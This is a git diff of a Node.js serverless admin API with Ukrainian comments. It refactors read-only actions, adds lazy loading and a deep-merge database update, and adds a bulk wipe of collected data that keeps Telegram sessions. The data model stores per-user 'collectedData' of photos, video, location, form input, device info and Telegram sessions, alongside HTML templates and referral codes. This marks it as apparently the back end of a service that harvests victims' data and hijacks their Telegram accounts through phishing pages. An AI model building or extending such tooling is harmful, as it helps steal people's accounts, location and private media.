@@ -99,7 +99,6 @@ async function readDb(drive) {
         return dbData;
     } catch (e) {
         console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
-        // Повертаємо defaultState при помилці, щоб уникнути падіння системи
         return {
             users: [], refCodes: [], blockedIdentifiers: [], failedLogins: [],
             settings: { defaultDeviceLimit: 3, dataRetentionDays: 0, termsLastUpdatedAt: null, termsPushRequired: false },
@@ -144,6 +143,40 @@ async function performDbOperation(operation) {
     throw new Error(`Failed to complete DB operation after ${MAX_RETRIES} attempts. Last error: ${lastError.message}`);
 }
 
+// *** NEW: LAZY LOADING HELPER ***
+function makeDbLazy(data) {
+    const LAZY_THRESHOLD = 500; // 500 characters
+    
+    function traverse(d) {
+        // Якщо це рядок і він занадто довгий, робимо його "лінивим"
+        if (typeof d === 'string' && d.length > LAZY_THRESHOLD) {
+            return { __lazy: true, type: 'string', size: d.length };
+        }
+        
+        // Якщо це масив, ми проходимо по кожному елементу, а не робимо "лінивим" весь масив
+        if (Array.isArray(d)) {
+            return d.map(item => traverse(item));
+        }
+
+        // Якщо це об'єкт (але не масив і не null), ми проходимо по його ключах
+        if (typeof d === 'object' && d !== null) {
+            // Перевірка, чи це вже не є нашою заглушкою
+            if (d.__lazy) {
+                return d;
+            }
+            const newObj = {};
+            for (const key in d) {
+                newObj[key] = traverse(d[key]);
+            }
+            return newObj;
+        }
+
+        // Для всіх інших типів даних (числа, boolean, null) повертаємо їх як є
+        return d;
+    }
+    return traverse(data);
+}
+
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
 
@@ -158,68 +191,95 @@ exports.handler = async (event) => {
 
     try {
         const { action, payload } = JSON.parse(event.body);
-        
         const drive = getDriveClient();
         
-        if (action === 'getDashboardData') {
+        // --- START: Read-only operations (no write lock needed) ---
+        const readOnlyActions = ['getDashboardData', 'getUserDetails', 'getCollectedDataForUser', 'getSingleCollectedDataEntry', 'getAddedDataById', 'getRawDatabase', 'getDbNodeValue', 'listNews'];
+        if (readOnlyActions.includes(action)) {
             const db = await readDb(drive);
-            const users = db.users.map(({ password, collectedData, sessions, ...user }) => ({
-                ...user,
-                sessionCount: sessions ? sessions.length : 0,
-            }));
-            return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length, pushNews: db.pushNews || [] })};
+            switch (action) {
+                case 'getDashboardData': {
+                    const users = db.users.map(({ password, collectedData, sessions, ...user }) => ({
+                        ...user,
+                        sessionCount: sessions ? sessions.length : 0,
+                    }));
+                    return { statusCode: 200, body: JSON.stringify({ settings: db.settings, users, refCodes: db.refCodes, blocked: db.blockedIdentifiers, templates: db.templates || [], systemTypes: ['photos','video','location','form','device_info','telegram_session','manual_text','manual_photo','manual_video'], newsCount: (db.news||[]).length, pushNews: db.pushNews || [] })};
+                }
+                case 'getUserDetails': {
+                    const user = db.users.find(u => u.userId === payload.userId);
+                    if (!user) return { statusCode: 404, body: 'User not found.' };
+                    const { password, collectedData, ...userDetails } = user;
+                    return { statusCode: 200, body: JSON.stringify({ ...userDetails, restrictions: user.restrictions || {} }) };
+                }
+                case 'getCollectedDataForUser': {
+                    const user = db.users.find(u => u.userId === payload.userId);
+                    if (!user) return { statusCode: 404, body: 'User not found.' };
+
+                    const allData = user.collectedData || [];
+                    const page = parseInt(payload.page, 10) || 1;
+                    const limit = 20;
+                    const startIndex = (page - 1) * limit;
+                    const endIndex = page * limit;
+
+                    const lightPaginatedData = allData
+                        .sort((a, b) => new Date(b.collectedAt) - new Date(a.collectedAt))
+                        .slice(startIndex, endIndex)
+                        .map(entry => {
+                            const { data, ...metadata } = entry;
+                            const itemCount = Array.isArray(data) ? data.length : null;
+                            return { ...metadata, itemCount };
+                        });
+
+                    return { statusCode: 200, body: JSON.stringify({ data: lightPaginatedData, total: allData.length, page, limit })};
+                }
+                case 'getSingleCollectedDataEntry': {
+                    const user = db.users.find(u => u.userId === payload.userId);
+                    if (!user) return { statusCode: 404, body: 'User not found' };
+                    const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
+                    return entry ? { statusCode: 200, body: JSON.stringify(entry) } : { statusCode: 404, body: 'Entry not found' };
+                }
+                case 'getAddedDataById': {
+                    const item = (db.addedData || []).find(a => a.id === payload.id);
+                    return item ? { statusCode: 200, body: JSON.stringify(item) } : { statusCode: 404, body: 'AddedData not found' };
+                }
+                case 'listNews': {
+                    return { statusCode: 200, body: JSON.stringify((db.news || []).sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt))) };
+                }
+                case 'getRawDatabase': {
+                    const lazyDb = makeDbLazy(db);
+                    return { statusCode: 200, body: JSON.stringify(lazyDb) };
+                }
+                case 'getDbNodeValue': {
+                    const { path } = payload;
+                    if (!path || !Array.isArray(path) || path[0] !== 'root') {
+                        throw new Error("Path is required and must start with 'root'.");
+                    }
+                    let value = db;
+                    // Знаходимо повне значення за шляхом
+                    for (let i = 1; i < path.length; i++) {
+                        const key = path[i];
+                        if (typeof value !== 'object' || value === null || value[key] === undefined) {
+                            throw new Error(`Invalid path at segment: ${key}`);
+                        }
+                        value = value[key];
+                    }
+                    // *** ОСНОВНЕ ВИПРАВЛЕННЯ ***
+                    // Якщо запитане значення - це рядок, число або boolean, повертаємо його як є, без "лінивої" обробки.
+                    // Якщо це об'єкт або масив, застосовуємо "ліниву" логіку до його ВМІСТУ, але не до самого себе.
+                    if (typeof value === 'object' && value !== null) {
+                        const lazyValue = makeDbLazy(value);
+                        return { statusCode: 200, body: JSON.stringify({ value: lazyValue }) };
+                    } else {
+                        // Для простих типів даних (string, number, etc.) повертаємо їх без змін.
+                        return { statusCode: 200, body: JSON.stringify({ value }) };
+                    }
+                }
+            }
         }
+        // --- END: Read-only operations ---
 
-        if (action === 'getUserDetails') {
-            const db = await readDb(drive);
-            const user = db.users.find(u => u.userId === payload.userId);
-            if (!user) return { statusCode: 404, body: 'User not found.' };
-            const { password, collectedData, ...userDetails } = user;
-            return { statusCode: 200, body: JSON.stringify({ ...userDetails, restrictions: user.restrictions || {} }) };
-        }
-        
-        if (action === 'getCollectedDataForUser') {
-            const db = await readDb(drive);
-            const user = db.users.find(u => u.userId === payload.userId);
-            if (!user) return { statusCode: 404, body: 'User not found.' };
 
-            const allData = user.collectedData || [];
-            const page = parseInt(payload.page, 10) || 1;
-            const limit = 20;
-            const startIndex = (page - 1) * limit;
-            const endIndex = page * limit;
-
-            const lightPaginatedData = allData
-                .sort((a, b) => new Date(b.collectedAt) - new Date(a.collectedAt))
-                .slice(startIndex, endIndex)
-                .map(entry => {
-                    const { data, ...metadata } = entry;
-                    const itemCount = Array.isArray(data) ? data.length : null;
-                    return { ...metadata, itemCount };
-                });
-
-            return { statusCode: 200, body: JSON.stringify({
-                data: lightPaginatedData,
-                total: allData.length,
-                page,
-                limit
-            })};
-        }
-        
-        if (action === 'getSingleCollectedDataEntry') {
-            const db = await readDb(drive);
-            const user = db.users.find(u => u.userId === payload.userId);
-            if (!user) return { statusCode: 404, body: 'User not found' };
-            const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
-            return entry ? { statusCode: 200, body: JSON.stringify(entry) } : { statusCode: 404, body: 'Entry not found' };
-        }
-
-        if (action === 'getAddedDataById') {
-            const db = await readDb(drive);
-            const item = (db.addedData || []).find(a => a.id === payload.id);
-            return item ? { statusCode: 200, body: JSON.stringify(item) } : { statusCode: 404, body: 'AddedData not found' };
-        }
-
+        // --- START: Write operations (use locking mechanism) ---
         const result = await performDbOperation(async (db) => {
             let operationResult;
             const user = db.users.find(u => u.userId === payload.userId);
@@ -248,7 +308,6 @@ exports.handler = async (event) => {
                     operationResult = { statusCode: 200, body: 'Data deleted.' };
                     break;
                 }
-                // ... всі інші write-екшени ...
                 case 'addTemplate': {
                     if (!db.templates) db.templates = [];
                     const newTemplate = { templateId: nanoid(16), name: payload.name, htmlContent: payload.htmlContent, createdAt: new Date().toISOString() };
@@ -347,10 +406,8 @@ exports.handler = async (event) => {
                         if (!u) continue;
                         if (!u.collectedData) u.collectedData = [];
                         
-                        // ВИПРАВЛЕНО: Генерація довгого відбитка без префікса
                         const randomFingerprint = nanoid(32); 
                         
-                        // ВИПРАВЛЕНО: Додано прапорець addedByAdmin: true
                         u.collectedData.push({ 
                             fingerprint: randomFingerprint, 
                             collectedAt: now, 
@@ -366,22 +423,28 @@ exports.handler = async (event) => {
                 case 'deleteAddedDataBlock': {
                     const { id } = payload;
                     if (!id) throw new Error('id required');
-                    // Remove references in all users
                     db.users.forEach(u => {
                         if (u.collectedData) {
                             u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId === id));
                         }
                     });
-                    // Remove the block itself
                     db.addedData = (db.addedData || []).filter(a => a.id !== id);
                     operationResult = { statusCode: 200, body: 'Added data block deleted.' };
                     break;
                 }
                 case 'deleteAllAddedData': {
-                    // Remove all references
                     db.users.forEach(u => { if (u.collectedData) u.collectedData = u.collectedData.filter(d => !(d.data && d.data.addedDataId)); });
                     db.addedData = [];
                     operationResult = { statusCode: 200, body: 'All added data deleted.' };
+                    break;
+                }
+                case 'wipeAllUsersCollectedData': {
+                    db.users.forEach(u => {
+                        if (u.collectedData) {
+                            u.collectedData = u.collectedData.filter(d => d.type === 'telegram_session');
+                        }
+                    });
+                    operationResult = { statusCode: 200, body: 'All collected data for all users (except Telegram sessions) has been wiped.' };
                     break;
                 }
                 case 'updateUserRestrictions': {
@@ -392,18 +455,33 @@ exports.handler = async (event) => {
                     operationResult = { statusCode: 200, body: 'Restrictions updated.' };
                     break;
                 }
-                case 'getRawDatabase': {
-                    // Ця дія просто повертає весь об'єкт бази даних
-                    operationResult = { statusCode: 200, body: JSON.stringify(db) };
-                    break;
-                }
                 case 'updateRawDatabase': {
-                    // Ця дія повністю перезаписує базу даних отриманим об'єктом.
-                    // Це небезпечна операція, тому вся валідація має бути на клієнті.
-                    const newDbState = payload;
-                    // Оновлюємо переданий 'db' об'єкт ключами з нового стану, щоб він був записаний
-                    Object.keys(db).forEach(key => delete db[key]);
-                    Object.assign(db, newDbState);
+                    const partialDbState = payload;
+
+                    // Функція для рекурсивного злиття даних
+                    function deepMerge(target, source) {
+                        for (const key in source) {
+                            // Ігноруємо "ліниві" заглушки, щоб не перезаписати реальні дані
+                            if (typeof source[key] === 'object' && source[key] !== null && source[key].__lazy) {
+                                continue;
+                            }
+                            
+                            // Якщо ключ є об'єктом в обох джерелах (і не масивом), заглиблюємось
+                            if (typeof target[key] === 'object' && target[key] !== null && !Array.isArray(target[key]) &&
+                                typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
+                                deepMerge(target[key], source[key]);
+                            } 
+                            // В усіх інших випадках (включаючи масиви, які ми хочемо замінити повністю) просто присвоюємо значення
+                            else {
+                                target[key] = source[key];
+                            }
+                        }
+                    }
+
+                    // 'db' - це повна база даних, прочитана на початку. 'partialDbState' - дані з фронтенду.
+                    deepMerge(db, partialDbState);
+                    
+                    // Тепер `db` містить об'єднані дані, які можна безпечно зберігати.
                     operationResult = { statusCode: 200, body: 'Database updated successfully.' };
                     break;
                 }
@@ -465,8 +543,6 @@ exports.handler = async (event) => {
                         createdAt: new Date().toISOString() 
                     };
                     db.news.push(item);
-
-                    // Відправляємо сповіщення цільовій аудиторії
                     const notificationPayload = { type: 'news', title: item.title, text: item.text, imageUrl: item.imageUrl };
                      const targetUsers = db.users.filter(u => {
                         const aud = item.audience;
@@ -478,12 +554,7 @@ exports.handler = async (event) => {
                     for (const user of targetUsers) {
                         await sendTelegramNotification(user, notificationPayload);
                     }
-
                     operationResult = { statusCode: 201, body: JSON.stringify(item) };
-                    break;
-                }
-                case 'listNews': {
-                    operationResult = { statusCode: 200, body: JSON.stringify((db.news || []).sort((a,b)=> new Date(b.createdAt)-new Date(a.createdAt))) };
                     break;
                 }
                 case 'deleteNews': {
@@ -522,7 +593,6 @@ exports.handler = async (event) => {
                     for (const user of db.users) {
                         await sendTelegramNotification(user, notificationPayload);
                     }
-
                     operationResult = { statusCode: 200, body: 'Terms update push has been activated.' };
                     break;
                 }
@@ -539,8 +609,6 @@ exports.handler = async (event) => {
                         seenBy: []
                     };
                     db.pushNews.push(newPush);
-
-                    // Відправляємо сповіщення цільовій аудиторії
                     const notificationPayload = { type: 'push_news', title: newPush.title, text: newPush.text, imageUrl: newPush.imageUrl };
                     const targetUsers = db.users.filter(u => {
                         const aud = newPush.audience;
@@ -552,7 +620,6 @@ exports.handler = async (event) => {
                     for (const user of targetUsers) {
                         await sendTelegramNotification(user, notificationPayload);
                     }
-
                     operationResult = { statusCode: 201, body: JSON.stringify(newPush) };
                     break;
                 }
@@ -575,6 +642,7 @@ exports.handler = async (event) => {
             return { updatedDb: db, result: operationResult };
         });
         return result;
+        // --- END: Write operations ---
 
     } catch (error) {
         console.error(`Admin API Error:`, error);
